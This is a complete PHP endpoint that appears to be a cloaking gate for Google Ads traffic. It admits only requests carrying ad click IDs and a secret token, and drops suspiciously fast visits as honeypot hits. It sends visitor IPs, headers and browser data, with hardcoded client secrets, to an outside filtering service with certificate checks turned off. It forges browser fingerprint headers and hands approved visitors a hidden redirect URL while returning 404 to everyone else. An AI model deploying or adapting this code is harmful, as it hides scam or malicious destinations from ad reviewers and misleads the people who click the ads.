<?php
const PALLADIUM_URL = 'https://rbl.palladium.expert';
const PALLADIUM_CLIENT_ID = 7222;
const PALLADIUM_CLIENT_COMPANY = 'iudzugek6PPjR0Hqfqls';
const PALLADIUM_CLIENT_SECRET = 'NzIyMml1ZHp1Z2VrNlBQalIwSHFmcWxzY2U2NmY2ZTZmOWRlZjUxMGFjNDBiYTJlNjVjMmFjZGEwMTQyZmZhZQ==';
const PROBE_TOKEN = '6b549ab0a2651d223afff43c5af554e6ceafa3d39e8b1d2d';
const PALLADIUM_CONNECT_TIMEOUT = 3;
const PALLADIUM_TIMEOUT = 4;

header('Access-Control-Allow-Origin: https://studiadesi.site');
header('Access-Control-Allow-Methods: POST');
header('Cache-Control: no-store');
header('X-Robots-Tag: noindex, nofollow');

$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';
if ($method !== 'POST') { http_response_code(404); exit; }

$token = isset($_POST['t']) && is_string($_POST['t']) ? $_POST['t'] : '';
if (!hash_equals(PROBE_TOKEN, $token)) { http_response_code(404); exit; }

$tracking = parseJsonField($_POST['data'] ?? '');
if (
    empty($tracking['gclid']) &&
    empty($tracking['gbraid']) &&
    empty($tracking['wbraid']) &&
    (($tracking['gad_source'] ?? '') !== '1')
) {
    http_response_code(404); exit;
}

$jsdata = parseJsonField($_POST['jsdata'] ?? '');
$elapsed = isset($jsdata['elapsed_ms']) ? (int)$jsdata['elapsed_ms'] : 0;
if ($elapsed > 0 && $elapsed < 200) {
    probeLog('honeypot_fast', ['elapsed' => $elapsed]);
    http_response_code(404); exit;
}

$verdict = (new ProbeRouter())->decide($tracking, $jsdata);
if ($verdict['ok']) {
    $forward = $tracking;
    if (!empty($forward['gclid'])) {
        unset($forward['gbraid'], $forward['wbraid']);
    } elseif (!empty($forward['gbraid'])) {
        unset($forward['wbraid']);
    }
    probeLog('pass', ['gclid' => $tracking['gclid'] ?? '', 'target' => $verdict['next']]);
    header('Content-Type: application/json');
    echo json_encode(['url' => appendTrackingParams($verdict['next'], $forward)]);
    exit;
}

probeLog('block', ['gclid' => $tracking['gclid'] ?? '']);
http_response_code(404);
exit;

function probeLog(string $event, array $ctx = []): void {
    error_log(
        date('c') . ' [' . $event . '] ip=' . ($_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? '-')
        . ' ua=' . substr($_SERVER['HTTP_USER_AGENT'] ?? '-', 0, 80)
        . ' ' . json_encode($ctx, JSON_UNESCAPED_SLASHES)
    );
}

function appendTrackingParams(string $url, array $tracking): string {
    if ($url === '' || empty($tracking)) return $url;
    $parts = parse_url($url);
    if (!$parts) return $url;
    parse_str($parts['query'] ?? '', $existing);
    $parts['query'] = http_build_query(array_merge($tracking, $existing));
    $q = $parts['query'] !== '' ? '?' . $parts['query'] : '';
    $frag = isset($parts['fragment']) ? '#' . $parts['fragment'] : '';
    return ($parts['scheme'] ?? 'https') . '://'
        . ($parts['host'] ?? '')
        . (isset($parts['port']) ? ':' . $parts['port'] : '')
        . ($parts['path'] ?? '') . $q . $frag;
}

function parseJsonField(string $raw): array {
    if ($raw === '') return [];
    $parsed = json_decode($raw, true);
    if (!is_array($parsed) && json_last_error() !== JSON_ERROR_NONE) {
        $parsed = json_decode(stripslashes($raw), true);
    }
    return is_array($parsed) ? $parsed : [];
}

class ProbeRouter {
    public function decide(array $tracking, array $jsdata): array {
        try {
            $payload = [
                'request'   => $tracking,
                'jsrequest' => $jsdata,
                'server'    => $this->collectHeaders(),
                'auth'      => [
                    'clientId'      => PALLADIUM_CLIENT_ID,
                    'clientCompany' => PALLADIUM_CLIENT_COMPANY,
                    'clientSecret'  => PALLADIUM_CLIENT_SECRET,
                ],
            ];
            $payload['server']['bannerSource'] = 'adwords';
            $reply = $this->askPalladium($payload);
            if ($reply === null) return ['ok' => false];
            return $this->mapReplyToVerdict($reply);
        } catch (\Throwable $e) {
            return ['ok' => false];
        }
    }

    private function askPalladium(array $payload): ?array {
        $curl = curl_init(PALLADIUM_URL);
        if (!$curl) return null;
        curl_setopt_array($curl, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => http_build_query($payload),
            CURLOPT_CONNECTTIMEOUT => PALLADIUM_CONNECT_TIMEOUT,
            CURLOPT_TIMEOUT        => PALLADIUM_TIMEOUT,
            CURLOPT_FORBID_REUSE   => true,
        ]);
        $body   = curl_exec($curl);
        $status = curl_getinfo($curl, CURLINFO_HTTP_CODE);
        curl_close($curl);
        if ($body === false || $status !== 200) return null;
        $decoded = json_decode($body, true);
        return is_array($decoded) ? $decoded : null;
    }

    private function mapReplyToVerdict(array $reply): array {
        if (!(bool)($reply['result'] ?? false)) return ['ok' => false];
        $mode   = isset($reply['mode']) ? (int)$reply['mode'] : 0;
        $target = isset($reply['target']) ? (string)$reply['target'] : '';
        if (in_array($mode, [1, 2, 3], true) && $target !== '') {
            $parts = parse_url($target);
            if (
                isset($parts['scheme'], $parts['host']) &&
                in_array(strtolower($parts['scheme']), ['http', 'https'], true)
            ) {
                return ['ok' => true, 'next' => $target];
            }
        }
        return ['ok' => false];
    }

    private function collectHeaders(): array {
        $userParams = [
            'REMOTE_ADDR', 'SERVER_PROTOCOL', 'SERVER_PORT', 'REMOTE_PORT',
            'QUERY_STRING', 'REQUEST_SCHEME', 'REQUEST_URI', 'REQUEST_TIME_FLOAT',
            'X_FB_HTTP_ENGINE', 'X_PURPOSE', 'X_FORWARDED_FOR', 'X_WAP_PROFILE',
            'X-Forwarded-Host', 'X-Forwarded-For', 'X-Frame-Options',
        ];
        $headers = [];
        foreach ($_SERVER as $k => $v) {
            if (in_array($k, $userParams, true) || strncmp($k, 'HTTP', 4) === 0) {
                $headers[$k] = $v;
            }
        }

        $realIp = $_SERVER['HTTP_CF_CONNECTING_IP']
            ?? $_SERVER['HTTP_X_FORWARDED_FOR']
            ?? $_SERVER['REMOTE_ADDR']
            ?? '';
        if ($realIp !== '') {
            $headers['REMOTE_ADDR'] = trim(explode(',', $realIp)[0]);
        }

        $headers['HTTP_SEC_FETCH_DEST']            = 'document';
        $headers['HTTP_SEC_FETCH_MODE']            = 'navigate';
        $headers['HTTP_SEC_FETCH_SITE']            = 'none';
        $headers['HTTP_SEC_FETCH_USER']            = '?1';
        $headers['HTTP_UPGRADE_INSECURE_REQUESTS'] = '1';

        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
        if (!isset($_SERVER['HTTP_SEC_CH_UA'])) {
            $isMobile = (bool)preg_match('/Mobile|Android|iPhone|iPad/i', $ua);
            $headers['HTTP_USER_AGENT'] = $isMobile
                ? 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36'
                : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36';
            $headers['HTTP_SEC_CH_UA']          = '"Google Chrome";v="130", "Chromium";v="130", "Not-A.Brand";v="99"';
            $headers['HTTP_SEC_CH_UA_MOBILE']   = $isMobile ? '?1' : '?0';
            $headers['HTTP_SEC_CH_UA_PLATFORM'] = $isMobile ? '"Android"' : '"Windows"';
        }
        $headers['HTTP_ACCEPT'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';

        return $headers;
    }
}
